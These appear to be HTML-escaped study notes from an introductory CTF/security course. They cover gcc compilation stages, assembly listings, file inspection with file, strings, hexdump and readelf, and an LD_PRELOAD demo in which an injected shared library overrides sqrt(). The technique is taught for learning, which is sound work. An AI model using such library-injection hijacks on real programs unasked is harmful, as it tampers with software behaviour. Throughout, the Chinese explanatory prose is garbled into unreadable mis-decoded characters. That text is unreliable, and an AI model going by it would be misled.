&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S1MRFyHc6.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ÂéüÁêÜËàáËß£Èáã&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;long long F[1000005];&lt;/code&gt;: ÂÆ£Âëä‰∏ÄÂÄãÈô£Âàó &lt;code&gt;F&lt;/code&gt; Áî®‰æÜÂ≠òÂÑ≤ Fibonacci Êï∏ÂàóÁöÑË®àÁÆóÁµêÊûú„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;long long f(int n)&lt;/code&gt;: ÂÆö‰∫Ü‰∏ÄÂÄãÈÅûËø¥ÂáΩÊï∏ &lt;code&gt;f&lt;/code&gt;ÔºåÁî®‰æÜË®àÁÆó Fibonacci Êï∏ÂàóÁöÑÁ¨¨ &lt;code&gt;n&lt;/code&gt; È†Ö„ÄÇÂ¶ÇÊûú &lt;code&gt;n&lt;/code&gt; ÁÇ∫ 0ÔºåËøîÂõû 0ÔºõÂ¶ÇÊûú &lt;code&gt;n&lt;/code&gt; ÁÇ∫ 1ÔºåËøîÂõû 1„ÄÇÂ¶ÇÊûú &lt;code&gt;F[n]&lt;/code&gt; ‰∏çÁ≠âÊñº -1Ôºå==Ë°®Á§∫Â∑≤Á∂ìË®àÁÆóÈÅé &lt;code&gt;f(n)&lt;/code&gt;ÔºåÁõ¥Êé•ËøîÂõû &lt;code&gt;F[n]&lt;/code&gt;==ÔºõÂê¶ÂâáÔºåË®àÁÆó &lt;code&gt;f(n-1) + f(n-2)&lt;/code&gt; ‰∏¶Â∞áÁµêÊûúÂ≠òÂÖ• &lt;code&gt;F[n]&lt;/code&gt;ÔºåÊúÄÂæåËøîÂõû &lt;code&gt;F[n]&lt;/code&gt;„ÄÇ&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1&gt;ÂæûÂéüÂßãÁ¢ºÂà∞ÂèØÂü∑Ë°åÊ™î&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;

#define FORMAT_STRING &amp;quot;%s&amp;quot;  //ÂÆöÁæ©FORMAT_STRINGÁÇ∫%sÂ≠ó‰∏≤Ëº∏Âá∫
#define MESSAGE &amp;quot;Hello, CTFer!\n&amp;quot; //ÂÆöÁæ©MESSAGEÁÇ∫Ë¶ÅËº∏Âá∫ÁöÑÂ≠ó‰∏≤ÂÖßÂÆπ

int
main(int argc, char *argv[]) {
  printf(FORMAT_STRING, MESSAGE); //Ëº∏Âá∫ÁµêÊûúÁÑ∂ÂæåÊèõË°å
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•ËàáÁµêÊûú&lt;ul&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyBB2lS5T.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJ7cCgBqa.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;gccÁöÑÂèÉÊï∏&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ÂéüÂßãÁ®ãÂºè: PLAYGROUND.c&lt;/li&gt;
&lt;li&gt;È†êËôïÁêÜÈöéÊÆµ ==&amp;gt; gcc ‚ÄìE PLAYGROUND.c ‚Äìo PLAYGROUND.i&lt;/li&gt;
&lt;li&gt;Á∑®Ë≠ØÈöéÊÆµ ==&amp;gt; gcc ‚ÄìS PLAYGROUND.i ‚Äìo PLAYGROUND.s&lt;/li&gt;
&lt;li&gt;ÁµÑË≠ØÈöéÊÆµ ==&amp;gt; gcc ‚Äìc PLAYGROUND.s ‚Äìo PLAYGROUND.o&lt;/li&gt;
&lt;li&gt;ÈÄ£ÁµêÈöéÊÆµ ==&amp;gt; gcc PLAYGROUND.o ‚Äìo PLAYGROUND&lt;/li&gt;
&lt;li&gt;export LD_LIBRARY_PATH=.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;ÂéüÁ®ãÂºè-&amp;gt;PLAYGROUND.c&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
int main(){
    printf(&amp;quot;Wu YiHung\n&amp;quot;);
   return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•&lt;img src=&quot;https://hackmd.io/_uploads/rkcJr-S56.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;È†êËôïÁêÜÈöéÊÆµ ==&amp;gt; &lt;code&gt;gcc -E PLAYGROUND.c -o PLAYGROUND.i&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•ËàáÁµêÊûú&lt;ul&gt;
&lt;li&gt;Á¢∫Ë™çÊúâ.iÁöÑÊ™îÊ°à&lt;img src=&quot;https://hackmd.io/_uploads/BJd2r-S5a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;ÂòóË©¶ÊâìÈñãÔºåÂá∫ÁèæÔºåÈÄôÂÄãÈöéÊÆµÊòØÂ∞áÊ®ôÈ†≠Ê™î&lt;code&gt;stdio.h&lt;/code&gt;ÁàÜÈñã &lt;img src=&quot;https://hackmd.io/_uploads/SylLQIZBqp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;# 0 &amp;quot;PLAYGROUND.c&amp;quot;
# 0 &amp;quot;&amp;lt;built-in&amp;gt;&amp;quot;
# 0 &amp;quot;&amp;lt;command-line&amp;gt;&amp;quot;
# 1 &amp;quot;/usr/include/stdc-predef.h&amp;quot; 1 3 4
# 0 &amp;quot;&amp;lt;command-line&amp;gt;&amp;quot; 2
# 1 &amp;quot;PLAYGROUND.c&amp;quot;
# 1 &amp;quot;/usr/include/stdio.h&amp;quot; 1 3 4
# 27 &amp;quot;/usr/include/stdio.h&amp;quot; 3 4
# 1 &amp;quot;/usr/include/aarch64-linux-gnu/bits/libc-header-start.h&amp;quot; 1 3 4
# 33 &amp;quot;/usr/include/aarch64-linux-gnu/bits/libc-header-start.h&amp;quot; 3 4
# 1 &amp;quot;/usr/include/features.h&amp;quot; 1 3 4
# 392 &amp;quot;/usr/include/features.h&amp;quot; 3 4
# 1 &amp;quot;/usr/include/features-time64.h&amp;quot; 1 3 4
# 20 &amp;quot;/usr/include/features-time64.h&amp;quot; 3 4

~~~‰∏≠ÈñìÁúÅÁï•Êï∏ÁôæË°å

extern void funlockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__));
# 885 &amp;quot;/usr/include/stdio.h&amp;quot; 3 4
extern int __uflow (FILE *);
extern int __overflow (FILE *, int);
# 902 &amp;quot;/usr/include/stdio.h&amp;quot; 3 4

# 2 &amp;quot;PLAYGROUND.c&amp;quot; 2

# 2 &amp;quot;PLAYGROUND.c&amp;quot;
int main(){
    printf(&amp;quot;Wu YiHung\n&amp;quot;);
   return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;Á∑®Ë≠ØÈöéÊÆµ ==&amp;gt; &lt;code&gt;gcc -S PLAYGROUND.i -o PLAYGROUND.s&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•ËàáÁµêÊûú&lt;/li&gt;
&lt;li&gt;Âü∑Ë°åÂæåÔºåÁî¢Áîü.sÊ™î&lt;img src=&quot;https://hackmd.io/_uploads/rydJ_Wr9T.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Áõ¥Êé•ÊâìÈñã&lt;code&gt;PLAYGROUND.s&lt;/code&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyyIOWHc6.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;yih@yih:~/Documents/C$ cat PLAYGROUND.s
    .arch armv8-a
    .file    &amp;quot;PLAYGROUND.c&amp;quot; //ÊåáÂÆö‰∫ÜÊñá‰ª∂ÁöÑÂêçÁ®±
    .text
    .section    .rodata
    .align    3
.LC0:
    .string    &amp;quot;Wu YiHung&amp;quot;
    .text
    .align    2
    .global    main
    .type    main, %function //Ë°®Á§∫Á®ãÂºèÁöÑÈñãÂßã
main:
.LFB0: //ÈÄôÊòØÂáΩÊï∏ÈñãÂßãÔºàLFBÔºâÊ®ôÁ±§Ôºå‰∏ãÊñπÊòØË®òÊÜ∂È´îÁ∑©Â≠òÊö´Â≠òÁöÑÂú∞ÂùÄ(ÂãïÊÖãË≥áË®ä)
    .cfi_startproc
    stp    x29, x30, [sp, -16]!
    .cfi_def_cfa_offset 16
    .cfi_offset 29, -16
    .cfi_offset 30, -8
    mov    x29, sp
    adrp    x0, .LC0
    add    x0, x0, :lo12:.LC0
    bl    puts
    mov    w0, 0
    ldp    x29, x30, [sp], 16
    .cfi_restore 30
    .cfi_restore 29
    .cfi_def_cfa_offset 0
    ret
    .cfi_endproc
.LFE0: //ÈÄôÊòØÂáΩÊï∏ÁµêÊùüÔºàLFEÔºâÊ®ôÁ±§
    .size    main, .-main
    .ident    &amp;quot;GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0&amp;quot; //GCC ÁöÑÁâàÊú¨
    .section    .note.GNU-stack,&amp;quot;&amp;quot;,@progbits
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÁµÑË≠ØÈöéÊÆµ ==&amp;gt; &lt;code&gt;gcc -c PLAYGROUND.s -o PLAYGROUND.o&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•ËàáÁµêÊûú - Âü∑Ë°åÂæåÁî¢Áîü&lt;code&gt;.o&lt;/code&gt;Ê™î&lt;img src=&quot;https://hackmd.io/_uploads/BkfH9ZB96.png&quot; alt=&quot;image&quot;&gt; - ÈñãÂïüÂæåÔºåÂ∞±Âá∫Áèæ‰∫Ü‰∫ÇÁ¢º!&lt;img src=&quot;https://hackmd.io/_uploads/rkKkj-r56.png&quot; alt=&quot;image&quot;&gt; - Âè™ËÉΩÂæû‰∏≠ÂæóÁü•ÊòØ‰∫åÈÄ≤Âà∂Êñá‰ª∂ÔºàELFÊ†ºÂºèÁöÑÂèØÂü∑Ë°åÊñá‰ª∂Ôºâ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;&lt;p&gt;ÈÄ£ÁµêÈöéÊÆµ ==&amp;gt; &lt;code&gt;gcc PLAYGROUND.o -o PLAYGROUND&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•ËàáÁµêÊûú&lt;ul&gt;
&lt;li&gt;Âü∑Ë°åÂæåÊñ∞Â¢û‰∫Ü&lt;code&gt;PLAYGROUND&lt;/code&gt;Ê™î&lt;img src=&quot;https://hackmd.io/_uploads/H1ex2WB9a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Âü∑Ë°åÊ™îÊ°à ==&amp;gt; &lt;code&gt;./PLAYGROUND&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;ÊúÄÂæåÂü∑Ë°åË©≤ÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/BJqS2bH5p.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;6&quot;&gt;
&lt;li&gt;&lt;p&gt;Ê™¢Ë¶ñÊ™îÊ°àÂ§ßÂ∞è==&amp;gt; ls -al PLAYGROUND.*&lt;img src=&quot;https://hackmd.io/_uploads/HJ1xaWH5T.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkFNa-rcp.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3&gt;ÁµÑÂêàË™ûË®ÄÊ†ºÂºè:INTEL vs AT&amp;amp;T Ê†ºÂºè&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Áî¢ÁîüAT&amp;amp;TË™ûÊ≥ïÊ†ºÂºèÁöÑÁµÑË™û(gccÈ†êË®≠‰ΩøÁî®ÁöÑÊ†ºÂºè) ==&amp;gt; gcc -S &lt;code&gt;-masm=att&lt;/code&gt; PLAYGROUND.c -o PLAYGROUND_att.s&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;ÁôºÁèæÂïèÈ°åÔºåÊÉ≥Âà∞Êó¢ÁÑ∂Âú®gccÊòØÈ†êË®≠ÔºåÈÇ£‰ΩïÂøÖÂä†ÂÖ•ÈÄôÊÆµÔºü&lt;img src=&quot;https://hackmd.io/_uploads/B1k2RWH9p.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Á¢∫ÂØ¶ÂèØ‰ª•&lt;img src=&quot;https://hackmd.io/_uploads/HkehVJGB5p.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ÈñãÂïüÂæåÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/ByVOJMBqT.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PLAYGROUND_att.s&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;    .arch armv8-a
    .file    &amp;quot;PLAYGROUND.c&amp;quot;
    .text
    .section    .rodata
    .align    3
.LC0:
    .string    &amp;quot;Wu YiHung&amp;quot;
    .text
    .align    2
    .global    main
    .type    main, %function
main:
.LFB0:
    .cfi_startproc
    stp    x29, x30, [sp, -16]!
    .cfi_def_cfa_offset 16
    .cfi_offset 29, -16
    .cfi_offset 30, -8
    mov    x29, sp
    adrp    x0, .LC0
    add    x0, x0, :lo12:.LC0
    bl    puts
    mov    w0, 0
    ldp    x29, x30, [sp], 16
    .cfi_restore 30
    .cfi_restore 29
    .cfi_def_cfa_offset 0
    ret
    .cfi_endproc
.LFE0:
    .size    main, .-main
    .ident    &amp;quot;GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0&amp;quot;
    .section    .note.GNU-stack,&amp;quot;&amp;quot;,@progbits
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Áî¢ÁîüIntelË™ûÊ≥ïÊ†ºÂºèÁöÑÁµÑË™û(ÂæÆËªüÈ†êË®≠‰ΩøÁî®ÁöÑÊ†ºÂºè) ==&amp;gt; gcc -S &lt;code&gt;-masm=intel&lt;/code&gt; PLAYGROUND.c &lt;code&gt;-o&lt;/code&gt; PLAYGROUND_intel.s&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ÁôºÁîüÂïèÈ°å&lt;img src=&quot;https://hackmd.io/_uploads/SJvIgfHcp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;ÊàëÁî®windowsÁöÑwindows powershellË©¶ÁúãÁúãÔºåÈÅãË°åÁÑ°Â†±ÈåØ&lt;img src=&quot;https://hackmd.io/_uploads/Hke9978cT.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;ÈÅãË°åÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/HkDJoQU9a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;PLAYGROUND_intel.s&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt!&quot;&gt;        .file   &amp;quot;PLAYGROUND.c&amp;quot;
        .intel_syntax noprefix
        .text
        .def    __main; .scl    2;      .type   32;     .endef
        .section .rdata,&amp;quot;dr&amp;quot;
.LC0:
        .ascii &amp;quot;Wu YiHung\0&amp;quot;
        .text
        .globl  main
        .def    main;   .scl    2;      .type   32;     .endef
        .seh_proc       main
main:
        push    rbp
        .seh_pushreg    rbp
        mov     rbp, rsp
        .seh_setframe   rbp, 0
        sub     rsp, 32
        .seh_stackalloc 32
        .seh_endprologue
        call    __main
        lea     rcx, .LC0[rip]
        call    puts
        mov     eax, 0
        add     rsp, 32
        pop     rbp
        ret
        .seh_endproc
        .ident  &amp;quot;GCC: (x86_64-win32-seh-rev0, Built by MinGW-W64 project) 8.1.0&amp;quot;
        .def    puts;   .scl    2;      .type   32;     .endef
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ÊØîËºÉ‰πãÁµêÊûú&lt;/h3&gt;
&lt;h2&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkZk8Ia26.png&quot; alt=&quot;image&quot;&gt;&lt;/h2&gt;
&lt;h1&gt;LD_PRELOAD&lt;/h1&gt;
&lt;h2&gt;ÂØ¶‰ΩúÁØÑ‰æãËàáÁµêÊûú&lt;/h2&gt;
&lt;h3&gt;ÁØÑ‰æãÁ®ãÂºè&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//PLAYGROUND.c
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;math.h&amp;gt;
int main() {
  double x;
  scanf(&amp;quot;%lf&amp;quot;, &amp;amp;x);
  printf(&amp;quot;%f\n&amp;quot;, sqrt(x));
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•&lt;img src=&quot;https://hackmd.io/_uploads/Skt257v5a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Âü∑Ë°åÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/S1CesXw5a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Èß≠ÂÖ•Á®ãÂºèÁØÑ‰æã&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;//inject.c
double sqrt(double x) {
  return 1122334455;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Á∑®Ë≠Ø‰∏¶Âü∑Ë°åÁúãÁúãË¢´Á´ÑÊîπÁöÑÁ≠îÊ°à&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Âü∑Ë°åÊåá‰ª§&lt;ol&gt;
&lt;li&gt;&lt;code&gt;gcc -o inject.so -shared inject.c&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LD_PRELOAD=./inject.so ./PLAYGROUND&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ÊØîËºÉ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;‰∏ªË¶ÅÁ®ãÂºèÁ¢ºÊòØË¶ÅÊ±ÇËº∏ÂÖ•ÂÄºÁöÑÈñãÊ†πËôüÔºå‰ΩÜÊúâ‰∫Ü&lt;code&gt;inject.c&lt;/code&gt;ÁöÑÊ≥®ÂÖ•Ôºå‰∏çÁÆ°Ëº∏ÂÖ•ÂÄºÊòØÂ§öÂ∞ëÔºåÂÉÖÊúÉËº∏Âá∫‰∫å&lt;ul&gt;
&lt;li&gt;inject.c‰∏≠ÁöÑ &lt;code&gt;retrun 1122334455;&lt;/code&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJ7aK7C26.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1&gt;Linux Âü∑Ë°åÊ™îÂàÜÊûê&lt;/h1&gt;
&lt;h2&gt;Linux fileÂëΩ‰ª§(command)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Êåá‰ª§&lt;ul&gt;
&lt;li&gt;&lt;code&gt;file /bin/ls&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;ÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/By1UWEw5p.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file xxx.png&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;ÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/ry8kfNP96.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file xxx.doc&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;ÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/S1fIfEvcT.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file xxx.pdf&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;ÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/BJRtfED5T.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;strings&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;strings /bin/ls&lt;/code&gt; - ‰∏ÄÂ†ÜÊù±Ë•ø&lt;img src=&quot;https://hackmd.io/_uploads/ByuXmVvc6.png&quot; alt=&quot;image&quot;&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;strings /bin/ls | grep Copyright&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;ÊâæÂà∞ÈóúÈçµÂ≠ó&lt;img src=&quot;https://hackmd.io/_uploads/SkoIXVDqa.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;strings hexedit | grep CTF&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;ÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/BJzlVEwca.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;hexdump | hd&lt;/h2&gt;
&lt;p&gt;È°ØÁ§∫Âü∑Ë°åÁï´Èù¢ËàáËß£Ë™™&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ELF(Executable and Linkable Format) ÁöÑÊ™îÊ°àÁâπÂæµ&lt;img src=&quot;https://hackmd.io/_uploads/ryMU84w56.png&quot; alt=&quot;image&quot;&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Sycb2Evcp.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;MP3 ÁöÑÊ™îÊ°àÁâπÂæµ&lt;img src=&quot;https://hackmd.io/_uploads/HJxg34w56.png&quot; alt=&quot;image&quot;&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HkCGnVP56.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;.jpg ÁöÑÊ™îÊ°àÁâπÂæµ
&lt;img src=&quot;https://hackmd.io/_uploads/Sy0EqO_9T.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HJsX5ud9a.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;.png ÁöÑÊ™îÊ°àÁâπÂæµ
&lt;img src=&quot;https://hackmd.io/_uploads/HyMD5d_qa.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SyQd9Od5a.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;size&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•ËàáÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/B13RgBwqp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Âú®ÈÄôÂÄãÊ™îÊ°à‰∏≠ÔºåÁ∏ΩÂ§ßÂ∞èÁÇ∫ 2806 bytes&lt;/li&gt;
&lt;li&gt;hexÔºàÂçÅÂÖ≠ÈÄ≤‰ΩçË°®Á§∫ÔºâÔºöaf6&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;ÂÖàÊääÊ™îÊ°à‰∏ãËºâ‰∏ã‰æÜ&lt;img src=&quot;https://hackmd.io/_uploads/rkWTtzHqp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Ëº∏ÂÖ•&lt;code&gt;git clone https://github.com/MyFirstSecurity2020/DATA202401.git&lt;/code&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hkzy5Mr9T.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href=&quot;https://github.com/MyFirstSecurity2020/DATA202401&quot;&gt;DATA202401&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;DAY1&lt;/h3&gt;
&lt;h4&gt;hexedit&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Áõ¥Êé•ÂÖàÊääÊ™îÊ°àÊâìÈñãÔºåÂ∞±ÊúÉÁúãÂà∞flagÔºå‰ΩÜÈÄô‰πüÂæàËÄÉÈ©óÁúºÂäõ&lt;ul&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ByutTWLcp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ÂèØ‰ª•Áî®strings ÁÑ∂ÂæåÂú®grepÂá∫‰æÜÂç≥ÂèØ&lt;ul&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJ-eRZI9T.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;networkingOK.pcap&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;‰πüÂèØ‰ª•‰ΩøÁî®Áõ∏ÂêåÁöÑÊñπÂºè&lt;ul&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryzLC-8qp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;hr&gt;
&lt;h1&gt;readelf&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;È°ØÁ§∫ /bin/ls ‰∫åÈÄ≤‰ΩçÊ™îÊ°àÁöÑ &lt;code&gt;ELF Ë°®È†≠(ELF Header)&lt;/code&gt; ==&amp;gt; readelf -h /bin/ls&lt;img src=&quot;https://hackmd.io/_uploads/r18mtrPca.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;È°ØÁ§∫Section Headers (-S Â§ßÂØ´) ==&amp;gt; readelf -S /bin/ls&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ê≠§ÈÅ∏È†ÖÈ°ØÁ§∫ÊúâÈóú ELF Ê™îÊ°à‰∏≠ÊØèÂÄãsectionsÁöÑË©≥Á¥∞Ë≥áË®ä„ÄÇÁØÄÊ®ôÈ°åÂåÖÊã¨ÂêçÁ®±(Name)„ÄÅÈ°ûÂûã(Type)„ÄÅÂú∞ÂùÄ(Address)„ÄÅÂ§ßÂ∞èÂíåÂÖ∂‰ªñÂ±¨ÊÄß„ÄÇ&lt;img src=&quot;https://hackmd.io/_uploads/SkKxqSP56.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;ÂÆåÊï¥ÁµêÊûú
&lt;code&gt; There are 28 section headers, starting at offset 0x1e428:&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000000238  00000238
       000000000000001b  0000000000000000   A       0     0     1
  [ 2] .note.gnu.bu[...] NOTE             0000000000000254  00000254
       0000000000000024  0000000000000000   A       0     0     4
  [ 3] .note.ABI-tags     NOTE             0000000000000278  00000278
       0000000000000020  0000000000000000   A       0     0     4
